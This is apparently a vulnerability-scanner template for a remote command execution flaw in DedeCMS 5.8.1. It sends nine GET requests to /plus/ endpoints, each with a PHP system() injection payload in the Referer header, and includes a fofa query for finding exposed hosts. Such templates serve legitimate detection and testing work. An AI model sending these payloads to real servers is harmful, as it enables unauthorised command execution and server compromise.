expression: r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7() || r8()
id: DedeCMS-common.func.php-RCE
info:
  author: daffainfo
  description: "DocCMS flink.php \u6587\u4EF6\u5B58\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\
    \u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u6267\
    \u884C\u4EFB\u610F\u547D\u4EE4\u3002\u6F0F\u6D1E\u5F71\u54CD\uFF1ADedeCMS v5.81\
    \ beta \u5185\u6D4B\u7248\nfofa-query: \"DedeCMS_V5.8.1\"\n"
  name: "DedeCMS common.func.php \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/DedeCMS%20common.func.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  severity: critical
rules:
  r0:
    expression: "response.status == 200 && response.body.bcontains(b'DedeCMS \u63D0\
      \u793A\u4FE1\u606F\uFF01') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')"
    request:
      headers:
        Accept: '*/*'
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Connection: close
        Referer: <?php "system"(ls);?>
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
        X-Requested-With: XMLHttpRequest
      method: GET
      path: /plus/flink.php?dopost=save
  r1:
    expression: "response.status == 200 && response.body.bcontains(b'DedeCMS \u63D0\
      \u793A\u4FE1\u606F\uFF01') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')"
    request:
      headers:
        Accept: '*/*'
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Connection: close
        Referer: <?php "system"(ls);?>
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
        X-Requested-With: XMLHttpRequest
      method: GET
      path: /plus/users_products.php?oid=1337
  r2:
    expression: "response.status == 200 && response.body.bcontains(b'DedeCMS \u63D0\
      \u793A\u4FE1\u606F\uFF01') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')"
    request:
      headers:
        Accept: '*/*'
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Connection: close
        Referer: <?php "system"(ls);?>
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
        X-Requested-With: XMLHttpRequest
      method: GET
      path: /plus/download.php?aid=1337
  r3:
    expression: "response.status == 200 && response.body.bcontains(b'DedeCMS \u63D0\
      \u793A\u4FE1\u606F\uFF01') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')"
    request:
      headers:
        Accept: '*/*'
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Connection: close
        Referer: <?php "system"(ls);?>
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
        X-Requested-With: XMLHttpRequest
      method: GET
      path: /plus/showphoto.php?aid=1337
  r4:
    expression: "response.status == 200 && response.body.bcontains(b'DedeCMS \u63D0\
      \u793A\u4FE1\u606F\uFF01') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')"
    request:
      headers:
        Accept: '*/*'
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Connection: close
        Referer: <?php "system"(ls);?>
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
        X-Requested-With: XMLHttpRequest
      method: GET
      path: /plus/users-do.php?fmdo=sendMail
  r5:
    expression: "response.status == 200 && response.body.bcontains(b'DedeCMS \u63D0\
      \u793A\u4FE1\u606F\uFF01') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')"
    request:
      headers:
        Accept: '*/*'
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Connection: close
        Referer: <?php "system"(ls);?>
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
        X-Requested-With: XMLHttpRequest
      method: GET
      path: /plus/posttocar.php?id=1337
  r6:
    expression: "response.status == 200 && response.body.bcontains(b'DedeCMS \u63D0\
      \u793A\u4FE1\u606F\uFF01') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')"
    request:
      headers:
        Accept: '*/*'
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Connection: close
        Referer: <?php "system"(ls);?>
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
        X-Requested-With: XMLHttpRequest
      method: GET
      path: /plus/vote.php?dopost=view
  r7:
    expression: "response.status == 200 && response.body.bcontains(b'DedeCMS \u63D0\
      \u793A\u4FE1\u606F\uFF01') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')"
    request:
      headers:
        Accept: '*/*'
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Connection: close
        Referer: <?php "system"(ls);?>
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
        X-Requested-With: XMLHttpRequest
      method: GET
      path: /plus/carbuyaction.php?do=clickout
  r8:
    expression: "response.status == 200 && response.body.bcontains(b'DedeCMS \u63D0\
      \u793A\u4FE1\u606F\uFF01') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')"
    request:
      headers:
        Accept: '*/*'
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Connection: close
        Referer: <?php "system"($c);/*
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
        X-Requested-With: XMLHttpRequest
      method: GET
      path: /plus/recommend.php?c=dir
